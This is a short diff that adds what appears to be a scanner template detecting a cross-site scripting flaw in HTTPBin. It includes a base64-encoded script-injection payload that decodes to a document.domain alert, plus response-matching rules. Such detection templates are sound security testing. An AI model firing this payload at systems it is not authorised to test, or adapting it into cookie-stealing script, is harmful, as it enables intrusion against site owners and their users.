@@ -1,0 +1,25 @@
+id: httpbin-xss
+brief:
+    title: HTTPBin - Cross-Site Scripting
+    by: Adam Crosser
+    level: high
+    about: HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launc...
+    label:
+        - xss
+        - httpbin
+        - oss
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
+      signs:
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
